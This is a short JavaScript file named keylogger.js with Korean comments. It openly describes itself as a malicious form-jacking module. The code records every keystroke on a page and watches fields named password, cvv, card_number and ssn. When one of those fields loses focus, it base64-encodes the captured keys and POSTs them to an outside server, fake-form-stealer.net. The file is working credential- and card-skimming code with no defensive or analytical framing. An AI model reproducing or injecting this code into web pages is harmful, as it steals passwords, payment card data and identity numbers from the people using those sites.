// 파일: keylogger.js
// 목적: 사용자의 폼 입력을 가로채 외부로 전송

console.log("악성 스크립트: 폼 재킹 모듈 로드됨.");

// 사이트의 모든 'input' 필드를 감시 대상으로 지정
const inputs = document.querySelectorAll('input');
let keystrokes = '';

// 감시 대상이 되는 민감한 필드 이름 (예: 신용카드, 비밀번호)
const sensitiveFields = ['password', 'cvv', 'card_number', 'ssn'];

// 키보드를 누를 때마다(keydown) 이벤트 리스너를 추가
document.addEventListener('keydown', (event) => {
    keystrokes += event.key;
});

// 사용자가 민감한 필드를 클릭할 때(focusout) 데이터 전송 시도
inputs.forEach(input => {
    if (sensitiveFields.includes(input.name)) {
        input.addEventListener('focusout', () => {
            // 지금까지 수집된 키스트로크를 악성 서버로 전송
            sendDataToAttacker(keystrokes);
            keystrokes = ''; // 수집 버퍼 비우기
        });
    }
});

function sendDataToAttacker(data) {
    // 사용자의 입력값을 base64로 인코딩하여 숨김
    const encodedData = btoa(data);
    
    // 악성 서버로 데이터 전송
    fetch('http://fake-form-stealer.net/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ k_data: encodedData })
    });
}